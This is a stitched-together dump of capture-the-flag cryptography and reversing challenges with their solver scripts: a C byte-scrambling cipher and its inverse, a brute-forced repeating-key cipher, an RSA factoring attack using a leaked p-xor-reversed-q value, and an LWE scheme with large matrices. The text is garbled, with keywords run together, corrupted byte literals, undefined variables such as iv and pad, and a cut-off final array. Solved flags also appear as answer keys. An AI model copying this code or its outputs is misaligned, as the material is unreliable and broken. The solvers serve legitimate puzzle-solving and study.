    for (int k = 0; k < 8; k++)        for (int m = 0; m < 8; m++)            if (((0x80 >> k) & rol(parts[m], 5)) != 0)                result[k] |= 0x80 >> m;
    for (int i = 0; i < 8; i++)        ret |= (uint64_t)result[i] << (i * 8);    return ret;}
intmain(){    uint64_t cipher[4] = { 0 };
    char input[] = "12345678876543211234567887654321";    for (int i = 0; i < 32; i += 8)        cipher[i / 8] = enc3(enc2(enc1(input + i)));
}
    #include<cstdint>#include<stdio.h>#include<Windows.h>
uint8_tror(uint8_t v, int n){    return ((v >> n) | (v << (8 - n))) & 0xFF;}
voiddec1(uint64_t cipher, char* plain){    uint64_t ret = 0;    uint8_t tmp1, tmp2;    uint8_t parts[8] = { 0 };
    for (int i = 0; i < 8; i++)        parts[i] = cipher >> ((7 - i) * 8);
    int i = 0;    while (i < 4) {        tmp1 = parts[i];        tmp2 = parts[i + 1];        parts[i + 2] ^= tmp2;        parts[i + 1] = tmp1 ^ tmp2 ^ parts[i + 2];        parts[i] = tmp1 ^ parts[i + 2];        i += 3;    }    memcpy(plain, parts, 8);}
uint64_tdec2(uint64_t cipher){    int64_t tmp = cipher;    for (int i = 0; i < 64; i++)    {        if (tmp & 1)        {            tmp = (tmp ^ 0x2EF20D07161E85F7) / 2;            tmp |= 0x8000000000000000;        }        else            tmp = (uint64_t)tmp / 2;    }    return tmp;}
uint64_tdec3(uint64_t cipher){    uint8_t parts[8] = { 0 };    uint8_t result[8] = { 0 };    uint64_t ret = 0;
    for (int i = 0; i < 8; i++)        parts[i] = (cipher >> i * 8) & 0xFF;
    for (int k = 0; k < 8; k++)        for (int m = 0; m < 8; m++)            if (parts[k] & (0x80 >> m))                result[m] |= ror(0x80 >> k, 5);
    for (int i = 0; i < 8; i++)        ret |= (uint64_t)result[i] << (i * 8);    return ret;}
intmain(){    char flag[33] = { 0 };
    uint64_t cipher[4] = { 0x8ADD5C04E5934C8, 0x199AC0E6DA4C2BC9, 0x0FF83F5E87D5510B5, 0x58447D6AD4E38B74 };
    for (int i = 0; i < 4; i++)        dec1(dec2(dec3(cipher[i])), flag + i * 8);
    puts(flag);}#5e28e27a835c4958b2d6dd186b21727a
printf("hello world!");importstring
from secret import hintfrom secret import encrypt
import random
dicts = string.ascii_lowercase +"{=}"
key = (''.join([random.choice(dicts) for i in range(4)])) * 8
assert(len(hint) == 32)
assert(len(key) == 32)

cipher = encrypt(hint, key) 
print(cipher)
# cp=wmaunapgimjfpopeblvup=aywqygb
importstringimport itertools
dicts = string.ascii_lowercase + "{=}"# print(dicts)
# key = (''.join([random.choice(dicts) for i in range(4)])) * 8enc = 'cp=wmaunapgimjfpopeblvup=aywqygb'for k in itertools.product(dicts, repeat=4):    key = ''.join(k)      key=key*8    print(key)    numenc = [dicts.index(i) for i in enc]      numkey = [dicts.index(i) for i in key]      flag = ''    for i in range(len(enc)):        # assert len(numenc) == len(numkey)        ans = (numenc[i] - numkey[i % 4]) % 29          flag += dicts[ans]    if flag.startswith('tell'):        print(flag)        break
    #tellasecret{a=secert}keepsilentt
from Crypto.Util.number import *from gmpy2 import*from secret import flag,a,b,c
m = bytes_to_long(flag)p = getPrime(256)q = getPrime(256)n = p * qe = 65537_q = int(bin(q)[2:][::-1] , 2)c = pow(m,e,n)
print('n =',n)print('c =',c)
'''n = 7688109450918412752403544831281002390909833419780604228031807748258766149305710928557842935597759373483911172486806200079137977020089610947423466744079981c = 6470273779347221033316093386019083111753019159457126878637258794718443144439812725263309232245307744208957171971247518708231996986359926490571921925899978'''
assert a**3+b**3+c**3 == 3*a*b*cgift = secert**3 - 9*secert + 8print(gift)
assert 3*(p ^ _q) == a + b + c
#16174454302590604301534105361719250538317088773024913985896374029052621214070408075926265229111851489902642328975085914458074453963086159246933939207642987161923181946601656883349077418380372857072224674380642689142603970810010050
import sympy
gift=16174454302590604301534105361719250538317088773024913985896374029052621214070408075926265229111851489902642328975085914458074453963086159246933939207642987161923181946601656883349077418380372857072224674380642689142603970810010050a = sympy.Symbol('a')f = a**3 - 9*a + 8-giftresult = sympy.solve([f],[a])print(result)
#25289672915296952421286820568694528489788342353673740247988495109991492893326
from Crypto.Util.number import *import sys
sys.setrecursionlimit(1500)
pxorq = 25289672915296952421286820568694528489788342353673740247988495109991492893326n = 7688109450918412752403544831281002390909833419780604228031807748258766149305710928557842935597759373483911172486806200079137977020089610947423466744079981c = 6470273779347221033316093386019083111753019159457126878637258794718443144439812725263309232245307744208957171971247518708231996986359926490571921925899978e = 65537pxorq = str(bin(pxorq)[2:]).zfill(256)

def find(ph, qh, pl, ql):    l = len(ph)    tmp0 = ph + (256 - 2 * l) * "0" + pl    tmp1 = ph + (256 - 2 * l) * "1" + pl    tmq0 = qh + (256 - 2 * l) * "0" + ql    tmq1 = qh + (256 - 2 * l) * "1" + ql    if (int(tmp0, 2) * int(tmq0, 2) > n):        return    if (int(tmp1, 2) * int(tmq1, 2) < n):        return    if (int(pl, 2) * int(ql, 2) % (2 ** (l - 1)) != n % (2 ** (l - 1))):        return
    if (l == 128):        pp0 = int(tmp0, 2)        if (n % pp0 == 0):            pf = pp0            qf = n // pp0            print(pf)            print(qf)            phi= (pf-1)*(qf-1)            d = inverse(e,phi)            m = pow(c,d,n)            print(long_to_bytes(m))
    else:        if (pxorq[l] == "1"and pxorq[255 - l] == "1"):            find(ph + "1", qh + "0", "1" + pl, "0" + ql)            find(ph + "0", qh + "0", "1" + pl, "1" + ql)            find(ph + "1", qh + "1", "0" + pl, "0" + ql)            find(ph + "0", qh + "1", "0" + pl, "1" + ql)        elif (pxorq[l] == "1"and pxorq[255 - l] == "0"):            find(ph + "1", qh + "0", "0" + pl, "0" + ql)            find(ph + "0", qh + "0", "0" + pl, "1" + ql)            find(ph + "1", qh + "1", "1" + pl, "0" + ql)            find(ph + "0", qh + "1", "1" + pl, "1" + ql)        elif (pxorq[l] == "0"and pxorq[255 - l] == "1"):            find(ph + "0", qh + "0", "1" + pl, "0" + ql)            find(ph + "0", qh + "1", "0" + pl, "0" + ql)            find(ph + "1", qh + "0", "1" + pl, "1" + ql)            find(ph + "1", qh + "1", "0" + pl, "1" + ql)        elif (pxorq[l] == "0"and pxorq[255 - l] == "0"):            find(ph + "0", qh + "0", "0" + pl, "0" + ql)            find(ph + "1", qh + "0", "0" + pl, "1" + ql)            find(ph + "0", qh + "1", "1" + pl, "0" + ql)            find(ph + "1", qh + "1", "1" + pl, "1" + ql)

find("1", "1", "1", "1")
from Crypto.Util.number import *from Crypto.Cipher import AESimport osfrom secret import flagimport numpy as np

def gen(q, n, N, sigma):    t = np.random.randint(0, high=q // 2, size=n)    s = np.concatenate([np.ones(1, dtype=np.int32), t])    A = np.random.randint(0, high=q // 2, size=(N, n))    e = np.round(np.random.randn(N) * sigma**2).astype(np.int32) % q    b = ((np.dot(A, t) + e).reshape(-1, 1)) % q    P = np.hstack([b, -A])    return P, s

def enc(P, M, q):    N = P.shape[0]    n = len(M)    r = np.random.randint(0, 2, (n, N))    Z = np.zeros((n, P.shape[1]), dtype=np.int32)    Z[:, 0] = 1    C = np.zeros((n, P.shape[1]), dtype=np.int32)    for i in range(n):        C[i] = (np.dot(P.T, r[i]) + (np.floor(q / 2) * Z[i] * M[i])) % q    return C

q = 127n = 3N = int(1.1 * n * np.log(q))sigma = 1.0
P, s = gen(q, n, N, sigma)

def prep(s):    return np.array([int(b) forchar in s for b in f"{ord(char):
08b}"], dtype=np.int32)

C = enc(P, prep(hint), q)P = P.tolist()C = C.tolist()print(f"{P=}")print(f"{C=}")
'''P=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]C=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]'''
key = os.urandom(16)encrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(b"".join([pad(i.encode(), 16) for i in flag]))
print(leak)print(key)print(encrypted)
'''-3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241b'x8fjx94x98-x1fdxd5x89xbexa9*Tux90xb7'b'x9fT@xbcx82x8esQx1exd8x1dxdbx9bxb4xf8rUxc8xa0xcbxaf Hxa9.x04x1exd2x92x1fx0fBja-x965xxa8@xc9xxf9xafx87xd1xa5}xfcx1bxe0#xc3mxc9x8973x1cx1fx13x8fxb2axaexa9]xb9xc2xe8x83Ax80x13gxc9ax1c<x8ax9c&xd9xbdx06xefxba9xb0x03x9fx022xc9x13x9axffXPGxc6oxc0xeaV7)XG9Lx84N7Uxe3Wn0Gx8exd3x04(nx08xb9x17xe6xf1xaaxb7x8a@$x16x13x06Ax00xc9Zxdfx7fQxc9x08xb4xf3Pxfcpexe2xebx96x0e(-xdex17xd1x01x1c_x82x8bx9fwxc8x86xfbwxb5xf7xd0xc8x1784xe3?x00x0b.)xb7xbcx8e{xe0xaex8d$x0fx19'xb6xee@dx00xd9x84x8cx0exa3,xc6axa3xba*1xfd<xfdx18xd6x9ex8c4x8e#xfdxbd&0RxeddE,xedxb6x1ex00x11xa6Kxd3x1dTx8c5x8ex00xeax10xe9'u"B#xa1#xd8xe3xf5jxbcx94Mxdaxe3xcb*xf0W1xa0x80x1dxfcxbfox01?(darxb6x86xd0x90x88Zxa1`Bx89x89x89xb3vxa5xf0xe0x0cx8excc+Pxfcxfd#x83xe9x93x96nxf2xa5xfbxc3xc5xaax9ex89x93xb6xf5xeax8c%NYxc3x0eRxfasxa1x13xf2/*xcex8b_:
_rxebxbex0bx8ax8cx97x7f|m}xaexa9Ix95xccxe7x80xa5yC4x1f5xa4Pxc5xbf.xf9Vxe8|xbbxc3xcbx98&'JBx99x94xc0r$x0bxbe48uxebxcaxa1xfbbxd8_Rx97x8exaeIxfcxc2xb2xd2#@xecx16xf1xd7eCQx1cOx13xcaxb5xd3x1axb1xf1_Dx80x06xa5xbexbevxbdxd6xbbx9axc9xx9cf:
xcb>xa2xe1xcadxde]awxa0xdcxb2xb3{+x85x8dx8bxc5rTxccxd9Xxd5x9br<x99mxb8b6sxbfpx0eo~xe9&xb2{xbexeex93xd2N1\x94x968IWO7xcbxb6ex80xf7x9airxb2~x17x1cFx0fx82T]RBXxdexx13x85xfaxcd-xcexdcxe4xe5^x99uxb5x01xd0-xc3Cxcdxc4y6xb7x9d|L1xe74xf7x8cHxe9xa9xfavnxec;xf2xa2wxfbx13_br)z!xa3xc8xa8xc2xd2x10x00x11x11rxb2&xfbx04&x84">x6l[x06n>xa0xbex9c`xa7x9exe0xfbx85x91xc4,xcfxacxe11@axed3@xfd}x8exfaTpxcb7xe7xbfxd4xe0~bxd9xe0<xbax81xd4"exfcx939|j#0Hx86xf8x0bx03xd2xe8xf5xe55xdcxc8x06\xb7)xccx9b'xf12''''
from Crypto.Util.number import *from tqdm import tqdmimport numpy as np
P=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]C=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 